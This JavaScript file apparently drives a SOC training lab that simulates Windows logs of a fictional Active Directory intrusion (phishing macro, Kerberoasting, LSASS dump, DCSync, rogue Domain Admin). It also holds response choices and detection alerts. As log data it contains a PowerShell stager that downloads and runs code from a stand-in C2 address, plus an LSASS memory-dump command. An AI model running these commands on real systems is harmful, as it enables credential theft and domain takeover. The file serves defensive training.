// Lab: "The service account that knew too much" (Halcyon Mutual, Saturday Oct 24, 2026). A FICTIONAL Active Directory
// intrusion built from real, documented techniques. Every log line is in the format Windows really writes.
//
//   Fri 16:38   Dana's admin account (a.admin) RDPs to CLAIMS-DB01 to patch it and never logs off. Its credentials
//               now sit in the memory of that server. (An ordinary admin habit, and the mistake the attack uses.)
//   Sat 00:41   Mike's workstation: a macro in Invoice_8841.docm starts an encoded PowerShell stager (T1204, T1059.001)
//   Sat 00:52   discovery with built-in tools: net group "Domain Admins" /domain, nltest, setspn -Q */* (T1087, T1018)
//   Sat 01:04   KERBEROASTING (T1558.003): m.chen's account asks the DC for service tickets for svc_sql and svc_web, with
//               RC4 encryption (0x17) instead of the AES (0x12) everything else uses. The attacker cracks them offline.
//   Sat 02:09   svc_sql signs in from Mike's workstation (it never does), runs PsExec on CLAIMS-DB01 (T1021.002)
//   Sat 02:13   LSASS memory dump with comsvcs.dll MiniDump (T1003.001): a.admin's credentials are in the dump
//   Sat 03:04   a.admin's ticket is requested from the DB server with RC4 (overpass-the-hash), then DCSYNC (T1003.006):
//               event 4662 on the DC with the "Replicating Directory Changes (All)" rights, by a user, not a DC
//   Sat 03:12   persistence: a new Domain Admin, svc_updater (T1136.002, T1098)
//
// Decoys: DC02 replicates with DC01 all day (4662 from a machine account is normal), an old NAS always asks for RC4
// tickets (Service Name ends in $), a.admin's legitimate Thursday RDP into the DC, svc_backup's nightly job.
// IPs: internal addresses are Halcyon's; 203.0.113.45 is the same C2 server the week's USB stick phoned home to.

import { T, logBuilder, finishDays, psEnc, adNoise, STAFF } from '../../game/logkit.js';

export const DATE = { weekday: 'SAT', name: 'Saturday', month: 'Oct', day: 24, year: 2026, domain: 'halcyonmutual.local', netbios: 'HALCYON' };
const DAY = 86400;
const A = (day, h, m, s = 0) => day * DAY + T(h, m, s);

export const C2 = '203.0.113.45';
const MIKE = '10.0.4.51';
const DANA = '10.0.4.40';
const DB = '10.0.3.50';
const DC1 = '10.0.3.10';
const VPN_POOL = '172.16.0.52';
const NAS = '10.0.3.77';

export const IP_INFO = {
  [C2]: { where: 'Moldova', owner: 'AS-KRANNET hosting', note: 'The command-and-control server from Monday\'s USB stick and the fake invoice. Mike\'s workstation is talking to it.', external: true },
  [MIKE]: { where: 'Internal: workstations', owner: 'WS-0131 (Mike Chen, Sales)', note: 'A sales laptop. It has no business talking to a domain controller about service accounts.' },
  [DB]: { where: 'Internal: servers', owner: 'CLAIMS-DB01 (SQL Server)', note: 'The claims database server. Dana patched it on Friday afternoon.' },
  [DC1]: { where: 'Internal: servers', owner: 'DC01', note: 'Primary domain controller.' },
  [DANA]: { where: 'Internal: workstations', owner: 'WS-0120 (Dana Kowalski, IT)', note: 'Where Dana\'s admin sessions normally start.' },
  [VPN_POOL]: { where: 'Internal: VPN pool', owner: 'VPN clients', note: 'Remote employees arrive from this range. Mike was working late from home.' },
  [NAS]: { where: 'Internal: servers', owner: 'NAS01 (old file appliance)', note: 'An old network storage box. It only knows the RC4 Kerberos cipher, and has for years.' },
  '10.0.3.30': { where: 'Internal: servers', owner: 'BACKUP01', note: 'Runs the nightly backup as svc_backup.' },
  '10.0.3.11': { where: 'Internal: servers', owner: 'DC02', note: 'Second domain controller. Replicates with DC01 all day.' },
};

const PS_STAGER = "IEX ((New-Object Net.WebClient).DownloadString('https://203.0.113.45/a.ps1'))";
export const STAGER_B64 = psEnc(PS_STAGER);
const POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
const WINWORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE';
const SYS32 = 'C:\\Windows\\System32\\';

export function generateLogs({ nowMinutes = 24 * 60 } = {}) {
  const b = logBuilder(2410);
  const { r, win, pick } = b;
  const jitter = (n) => Math.floor(r() * n);

  // ---------------- Friday: a normal working day, plus the habit the attack uses ----------------
  const arrivals = { 'priya.r': T(7, 32), 'dana.k': T(5, 55), 't.okoye': T(7, 55), 'm.chen': T(8, 21), 'c.reyes': T(8, 7), 's.okafor': T(8, 2), 'j.alvarez': T(8, 47) };
  const staff = Object.entries(arrivals).map(([sam, at]) => [sam, STAFF[sam][0], STAFF[sam][1], at]);
  adNoise(b, { users: staff, base: A(-1, 0, 0), end: T(17, 40) });
  // Saturday: only a backup, a few machine accounts, and the old NAS
  adNoise(b, { users: [], base: A(0, 0, 0), end: T(8, 30) });

  win(A(-1, 10, 14, 6), 'dc01', 4624, { user: 'a.admin', ip: DANA, ws: 'WS-0120', type: 10, logonId: b.logonId(), elevated: true }, { noise: true, key: 'decoy-admin-logon' });
  win(A(-1, 10, 14, 7), 'dc01', 4672, { user: 'a.admin' }, { noise: true });
  win(A(-1, 10, 52, 40), 'dc01', 4634, { user: 'a.admin', type: 10 }, { noise: true });
  win(A(-1, 16, 38, 12), 'claims-db01', 4624, { user: 'a.admin', ip: DANA, ws: 'WS-0120', type: 10, logonId: '0x7B3C91', elevated: true }, { key: 'da-session', user: 'a.admin', ip: DANA });
  win(A(-1, 16, 38, 13), 'claims-db01', 4672, { user: 'a.admin', logonId: '0x7B3C91' }, { user: 'a.admin' });
  win(A(-1, 17, 31, 0), 'claims-db01', 4634, { user: 'a.admin', type: 3, logonId: '0x7B3A11' }, { user: 'a.admin', noise: true }); // a network logoff; the RDP session stays "Disconnected"
  win(A(-1, 17, 9, 15), 'claims-db01', 4688, { user: 'a.admin', proc: 'C:\\Windows\\System32\\wuauclt.exe', parent: 'C:\\Windows\\System32\\services.exe', cmd: 'wuauclt.exe /detectnow /updatenow', logonId: '0x7B3C91' }, { user: 'a.admin', noise: true });

  // DC02 replicates with DC01 all day: 4662 from a MACHINE account is normal
  for (let t = A(-1, 0, 4); t < A(0, 9, 0); t += 1800 + jitter(900)) {
    win(t, 'dc01', 4662, { user: 'DC02$', by: 'DC02$' }, { user: 'DC02$', ip: '10.0.3.11', noise: true, key: t < A(-1, 0, 40) ? 'decoy-repl' : undefined });
  }

  // svc_backup's nightly job (Friday night, Sat 02:00)
  win(A(0, 2, 0, 3), 'dc01', 4768, { user: 'svc_backup', ip: '10.0.3.30', enc: '0x12' }, { user: 'svc_backup', ip: '10.0.3.30', noise: true });
  win(A(0, 2, 0, 5), 'dc01', 4769, { user: 'svc_backup', service: 'FILE01$', ip: '10.0.3.30', enc: '0x12' }, { user: 'svc_backup', ip: '10.0.3.30', noise: true, key: 'decoy-backup' });
  win(A(0, 2, 0, 9), 'file01', 4624, { user: 'svc_backup', ip: '10.0.3.30', ws: 'BACKUP01', type: 3, kerberos: true, logonId: b.logonId() }, { user: 'svc_backup', ip: '10.0.3.30', noise: true });

  // ---------------- Saturday: the intrusion ----------------
  win(A(0, 0, 29, 48), 'ws-0131', 4624, { user: 'm.chen', ip: VPN_POOL, ws: 'VPN01', type: 10, logonId: '0x1C4A7F' }, { user: 'm.chen', ip: VPN_POOL });
  const docCmd = `"${WINWORD}" "C:\\Users\\m.chen\\Downloads\\Invoice_8841.docm"`;
  const encCmd = `powershell.exe -nop -w hidden -enc ${STAGER_B64}`;
  b.sysmon1(A(0, 0, 41, 12), 'ws-0131', { user: 'HALCYON\\m.chen', image: POWERSHELL, cmd: encCmd, parent: WINWORD, parentCmd: docCmd, cwd: 'C:\\Users\\m.chen\\Documents\\', description: 'Windows PowerShell', original: 'PowerShell.EXE' }, { attack: true, key: 'phish-macro', ip: undefined });
  win(A(0, 0, 41, 12), 'ws-0131', 4688, { user: 'm.chen', proc: POWERSHELL, parent: WINWORD, cmd: encCmd, logonId: '0x1C4A7F' }, { attack: true, user: 'm.chen' });
  win(A(0, 0, 41, 19), 'ws-0131', 4104, { user: 'm.chen', script: PS_STAGER, path: '' }, { attack: true, key: 'stager-script', user: 'm.chen' });
  // beacons every few minutes until the shift starts
  for (let t = A(0, 0, 41, 20), i = 0; t < A(0, 8, 0); t += 300 + jitter(420), i++) {
    b.sysmon3(t, 'ws-0131', { user: 'HALCYON\\m.chen', image: POWERSHELL, srcIp: MIKE, dstIp: C2, dstPort: 443, dstPortName: 'https', rule: 'technique_id=T1071,technique_name=Application Layer Protocol' }, { attack: true, key: i === 0 ? 'c2-beacon' : undefined });
  }

  // discovery with built-in tools
  const recon = [
    [A(0, 0, 52, 3), `${SYS32}net.exe`, 'net group "Domain Admins" /domain', 'recon-dadmins'],
    [A(0, 0, 52, 31), `${SYS32}nltest.exe`, 'nltest /dclist:halcyonmutual.local', undefined],
    [A(0, 0, 53, 10), `${SYS32}setspn.exe`, 'setspn -T halcyonmutual.local -Q */*', 'recon-spn'],
    [A(0, 0, 53, 44), `${SYS32}whoami.exe`, 'whoami /groups', undefined],
  ];
  for (const [t, proc, cmd, key] of recon) win(t, 'ws-0131', 4688, { user: 'm.chen', proc, parent: POWERSHELL, cmd, logonId: '0x1C4A7F' }, { attack: true, user: 'm.chen', key });

  // Kerberoasting: two service tickets, RC4, in two seconds, for accounts a salesperson never touches
  win(A(0, 1, 4, 11), 'dc01', 4769, { user: 'm.chen', service: 'svc_sql', ip: MIKE, enc: '0x17', port: 51201 }, { attack: true, key: 'kerberoast', user: 'm.chen', ip: MIKE });
  win(A(0, 1, 4, 12), 'dc01', 4769, { user: 'm.chen', service: 'svc_web', ip: MIKE, enc: '0x17', port: 51202 }, { attack: true, key: 'kerberoast-2', user: 'm.chen', ip: MIKE });

  // the cracked password is used (about an hour later)
  win(A(0, 2, 9, 41), 'dc01', 4768, { user: 'svc_sql', ip: MIKE, enc: '0x12', port: 51377 }, { attack: true, key: 'svc-sql-tgt', user: 'svc_sql', ip: MIKE });
  win(A(0, 2, 9, 55), 'claims-db01', 4624, { user: 'svc_sql', ip: MIKE, ws: 'WS-0131', type: 3, kerberos: true, logonId: '0x7E10C2' }, { attack: true, key: 'svc-sql-logon', user: 'svc_sql', ip: MIKE });
  win(A(0, 2, 9, 55), 'claims-db01', 4672, { user: 'svc_sql', logonId: '0x7E10C2' }, { attack: true, user: 'svc_sql', ip: MIKE });
  win(A(0, 2, 10, 30), 'claims-db01', 5140, { user: 'svc_sql', ip: MIKE, share: '\\\\*\\ADMIN$', sharePath: '\\??\\C:\\Windows' }, { attack: true, key: 'admin-share', user: 'svc_sql', ip: MIKE });
  win(A(0, 2, 10, 41), 'claims-db01', 7045, { service: 'PSEXESVC', path: '%SystemRoot%\\PSEXESVC.exe' }, { attack: true, key: 'psexec-svc' });
  win(A(0, 2, 10, 42), 'claims-db01', 4688, { user: 'SYSTEM', proc: 'C:\\Windows\\PSEXESVC.exe', parent: `${SYS32}services.exe`, cmd: 'C:\\Windows\\PSEXESVC.exe', logonId: '0x3E7' }, { attack: true });
  win(A(0, 2, 12, 20), 'claims-db01', 4688, { user: 'svc_sql', proc: `${SYS32}quser.exe`, parent: `${SYS32}cmd.exe`, cmd: 'quser', logonId: '0x7E10C2' }, { attack: true, key: 'quser', user: 'svc_sql' });
  win(A(0, 2, 13, 45), 'claims-db01', 4688, { user: 'svc_sql', proc: `${SYS32}rundll32.exe`, parent: `${SYS32}cmd.exe`, cmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\ms.dmp full', logonId: '0x7E10C2' }, { attack: true, key: 'lsass-dump', user: 'svc_sql' });
  b.sysmon10(A(0, 2, 13, 46), 'claims-db01', { sourceImage: `${SYS32}rundll32.exe`, targetImage: `${SYS32}lsass.exe`, access: '0x1fffff', sourceUser: 'NT AUTHORITY\\SYSTEM', targetUser: 'NT AUTHORITY\\SYSTEM', trace: 'C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2b7a3|C:\\Windows\\SYSTEM32\\comsvcs.dll+2c4b2|C:\\Windows\\System32\\RUNDLL32.EXE+1b3a' }, { attack: true, key: 'sysmon-lsass' });
  b.sysmon11(A(0, 2, 13, 51), 'claims-db01', { user: 'NT AUTHORITY\\SYSTEM', image: `${SYS32}rundll32.exe`, file: 'C:\\Windows\\Temp\\ms.dmp' }, { attack: true, key: 'dump-file' });
  win(A(0, 2, 15, 30), 'claims-db01', 5140, { user: 'svc_sql', ip: MIKE, share: '\\\\*\\C$', sharePath: '\\??\\C:\\' }, { attack: true, key: 'dump-copied', user: 'svc_sql', ip: MIKE });
  win(A(0, 2, 19, 5), 'claims-db01', 4688, { user: 'svc_sql', proc: `${SYS32}cmd.exe`, parent: 'C:\\Windows\\PSEXESVC.exe', cmd: 'cmd.exe /c del C:\\Windows\\Temp\\ms.dmp', logonId: '0x7E10C2' }, { attack: true, user: 'svc_sql' });

  // a.admin's ticket from a place a.admin has never been (RC4 = a hash, not a password), then DCSync
  win(A(0, 3, 4, 52), 'dc01', 4768, { user: 'a.admin', ip: DB, enc: '0x17', port: 51401 }, { attack: true, key: 'da-rc4-tgt', user: 'a.admin', ip: DB });
  win(A(0, 3, 4, 58), 'dc01', 4624, { user: 'a.admin', ip: DB, ws: 'CLAIMS-DB01', type: 3, kerberos: true, logonId: '0x9A04D1' }, { attack: true, key: 'da-logon-db', user: 'a.admin', ip: DB });
  win(A(0, 3, 4, 58), 'dc01', 4672, { user: 'a.admin', logonId: '0x9A04D1' }, { attack: true, user: 'a.admin', ip: DB });
  win(A(0, 3, 5, 2), 'dc01', 4662, { user: 'a.admin', by: 'a.admin', logonId: '0x9A04D1' }, { attack: true, key: 'dcsync', user: 'a.admin', ip: DB });
  win(A(0, 3, 5, 5), 'dc01', 4662, { user: 'a.admin', by: 'a.admin', logonId: '0x9A04D1' }, { attack: true, user: 'a.admin', ip: DB });
  win(A(0, 3, 5, 9), 'dc01', 4662, { user: 'a.admin', by: 'a.admin', logonId: '0x9A04D1' }, { attack: true, user: 'a.admin', ip: DB });

  // persistence: a new Domain Admin
  win(A(0, 3, 12, 30), 'dc01', 4720, { by: 'a.admin', bySid: undefined, user: 'svc_updater', display: 'svc_updater' }, { attack: true, key: 'rogue-create', user: 'svc_updater', ip: DB });
  win(A(0, 3, 12, 31), 'dc01', 4724, { by: 'a.admin', user: 'svc_updater' }, { attack: true, user: 'svc_updater' });
  win(A(0, 3, 12, 34), 'dc01', 4738, { by: 'a.admin', user: 'svc_updater', oldUac: '0x15', newUac: '0x10200', uacText: "'Don't Expire Password' - Enabled\n\t\t'Normal Account' - Enabled" }, { attack: true, user: 'svc_updater' });
  win(A(0, 3, 12, 38), 'dc01', 4728, { by: 'a.admin', member: 'svc_updater', memberDn: 'CN=svc_updater,CN=Users,DC=halcyonmutual,DC=local', group: 'Domain Admins' }, { attack: true, key: 'rogue-da', user: 'svc_updater' });
  win(A(0, 3, 20, 14), 'dc01', 4624, { user: 'svc_updater', ip: MIKE, ws: 'WS-0131', type: 3, logonId: b.logonId() }, { attack: true, key: 'rogue-logon', user: 'svc_updater', ip: MIKE });

  // Saturday morning: Mike's real report, and nothing else out of the ordinary
  win(A(0, 6, 3, 2), 'dc01', 4768, { user: 'priya.r', ip: '10.0.4.17', enc: '0x12' }, { user: 'priya.r', ip: '10.0.4.17', noise: true });

  return finishDays(b.ev, { nowMinutes, date: DATE });
}

// ---------------------------------------------------------------------------------------------- the case
export const CASE = {
  id: 'case',
  area: 'SOC investigation',
  title: 'A salesperson\'s laptop, a service account, and a new Domain Admin',
  max: 40,
  question: 'What happened in the domain overnight?',
  teaches: { skill: 'Trace an Active Directory intrusion: Kerberoasting, credential theft and DCSync in the Windows event logs', secplus: '4.9 Use data sources: Windows security logs; 2.4 Malicious activity' },
  verdicts: [
    { id: 'chain', text: 'A phished workstation was used to Kerberoast svc_sql. Its cracked password gave admin on CLAIMS-DB01, where a domain admin\'s credentials were in memory. The attacker used them to DCSync the domain\'s password hashes and created a hidden Domain Admin (svc_updater).' },
    { id: 'dc02', text: 'A normal replication between the domain controllers. The 4662 events are harmless.' },
    { id: 'insider', text: 'Dana did all of this herself: the account used is hers.' },
    { id: 'brute', text: 'An attacker guessed passwords until one worked, then walked straight onto the domain controller.' },
  ],
  correctVerdict: 'chain',
  wrongVerdictNotes: {
    dc02: 'DC02$ replicating is normal: that is a domain controller (a machine account) and it happens all day. These 4662 events are by a.admin, a user, with the "Replicating Directory Changes (All)" right, sent from the database server. That is what DCSync looks like.',
    insider: 'The ticket for a.admin was requested with RC4 from the database server, a place Dana never uses her admin account from, at 3 AM, minutes after an LSASS dump on that same server. That is her stolen credential, not Dana.',
    brute: 'There are no failed logons. Every step used a valid ticket or credential: Kerberoasted service account passwords, then a stolen admin session. That is why password-guessing alerts never fired.',
  },
  actions: [
    { id: 'isolate', text: 'Isolate WS-0131 and CLAIMS-DB01 from the network (keep them powered on) and take memory and disk images first', good: true },
    { id: 'rogue', text: 'Disable svc_updater and take it out of Domain Admins, keeping the account and its logs as evidence', good: true },
    { id: 'krbtgt', text: 'Reset the krbtgt password twice (waiting for replication between the resets), then reset every Domain Admin and every service account', good: true },
    { id: 'svcsql', text: 'Replace svc_sql with a group managed service account (or a 25+ character random password) and require AES for service accounts', good: true },
    { id: 'tiering', text: 'Stop admin accounts from logging on to servers and workstations they do not own (tiering), and add Domain Admins to Protected Users', good: true },
    { id: 'detect', text: 'Alert on 4662 with the replication rights by anyone who is not a domain controller, and on RC4 (0x17) service tickets for user accounts', good: true },
    { id: 'hunt', text: 'Hunt the whole domain for the stager, the C2 address and svc_updater logons before declaring it clean', good: true },
    { id: 'reboot', text: 'Reboot CLAIMS-DB01 and delete C:\\Windows\\Temp\\ms.dmp so it is clean again', good: false, why: 'A reboot wipes the memory you need to see what the attacker took, and deleting the file destroys evidence. Isolate and image first.' },
    { id: 'delete', text: 'Delete svc_updater and call it done', good: false, why: 'The attacker already has every password hash in the domain. Deleting one account leaves the real problem: they can make a golden ticket or log in as anyone until krbtgt and the admin passwords are reset.' },
    { id: 'krbtgt-once', text: 'Reset krbtgt once, today', good: false, why: 'Active Directory keeps the current AND the previous krbtgt password. One reset leaves the old one valid. Reset it twice, with time for replication in between, or old tickets keep working.' },
    { id: 'blockip', text: 'Block 203.0.113.45 at the firewall and close the case', good: false, why: 'The attacker already moved through internal accounts that never touch the firewall. Blocking one IP is fine as a step, but it is not containment of a domain compromise.' },
  ],
  primaryEvidence: { key: 'dcsync', note: 'The key line: event 4662 on DC01 by a.admin (a user, not a domain controller) with the replication rights {1131f6aa...} and {1131f6ad...}, minutes after her ticket was requested from the database server.' },
  keyEvidence: ['phish-macro', 'recon-dadmins', 'kerberoast', 'svc-sql-logon', 'lsass-dump', 'da-rc4-tgt', 'dcsync', 'rogue-da', 'da-session'],
  containedRequires: ['isolate', 'krbtgt'],
  costs: {
    contained: { amount: 85000, text: 'Incident response, two krbtgt resets, a password rotation for 400 accounts and a weekend of overtime (estimate for this lab)' },
    breach: { amount: 1200000, text: 'The attacker keeps every hash in the domain and a Domain Admin account. Next step: ransomware on every server, or a golden ticket that works for years (estimate for this lab)' },
  },
  perfectWhy: 'Right order: stop the spread without destroying evidence, remove the persistence, then reset what the attacker already copied (krbtgt twice, admin and service accounts), and fix the habits that made it work: an old service account password, a Domain Admin logged in to a server, and no alert on DCSync.',
  notSubmittedWhy: 'Nobody wrote it up. svc_updater is still a Domain Admin and the attacker still has every hash in the domain.',
};

export const ALERTS = [
  {
    id: 'ad-kerb',
    title: 'Possible Kerberoasting: RC4 service tickets for user accounts',
    severity: 'High',
    rule: 'More than one service ticket (4769) with Ticket Encryption Type 0x17 for a user-account service (name does not end in $) from the same client within 60 seconds.',
    fields: [
      ['Client', '10.0.4.51 (WS-0131, m.chen)'],
      ['Service accounts', 'svc_sql, svc_web'],
      ['Ticket encryption', '0x17 (RC4). Normal tickets in this domain use 0x12 (AES)'],
      ['When', 'Sat 01:04, two tickets in two seconds'],
    ],
    trigger: { when: (st, min) => min >= 8 * 60 + 40 },
    notice: '🚨 SIEM alert (High): possible Kerberoasting from WS-0131',
    chat: [
      'Look at this one first: two RC4 service tickets for svc_sql and svc_web, from a sales laptop, in two seconds.',
      'Everyone else in this domain uses AES. RC4 tickets are the ones an attacker takes home to crack offline. That is Kerberoasting.',
      'Do not stop at the alert. Ask what the account did next.',
    ],
  },
  {
    id: 'ad-dcsync',
    main: true,
    title: 'Directory replication requested by a non-domain-controller (possible DCSync)',
    severity: 'Critical',
    rule: 'Event 4662 on a domain controller with the control-access rights DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, where the subject is not a domain controller machine account.',
    fields: [
      ['Subject', 'HALCYON\\a.admin (Domain Admins)'],
      ['Rights', '{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} and {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}'],
      ['Domain controller', 'DC01'],
      ['When', 'Sat 03:05, three requests in seven seconds'],
    ],
    trigger: { when: (st, min) => (st.visited.includes('tickets') && min >= 9 * 60 + 30) || min >= 10 * 60 + 30 },
    notice: '🚨 SIEM alert (Critical): DCSync against DC01 by a.admin',
    chat: [
      'This is the big one: someone asked DC01 to hand over password data for the whole domain, using a.admin.',
      'Dana was asleep at 3 AM. Work backward: where was that ticket requested from, and what happened on that server just before?',
      'Search for 4662, then for the RC4 ticket for a.admin. Then check who is in Domain Admins with PowerShell or AD Users and Computers, and write the case up at the SOC console.',
    ],
    case: CASE,
  },
];
